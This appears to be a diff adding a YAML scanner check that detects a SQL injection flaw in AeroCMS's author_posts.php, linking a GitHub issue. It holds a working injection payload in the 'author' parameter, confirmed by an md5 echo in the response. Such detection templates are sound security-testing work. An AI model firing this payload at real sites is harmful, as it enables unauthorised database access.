@@ -1,0 +1,13 @@
+name: aerocms-front-sql
+set:
+  s1: randomInt(100000, 200000)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /author_posts.php?author=admin' AND (SELECT 9591 FROM (SELECT(md5({{s1}})))ONHE)-- jqaW&p_id=1
+    expression: response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
+expression: r0()
+detail:
+  links:
+    - https://github.com/MegaTKC/AeroCMS/issues/6
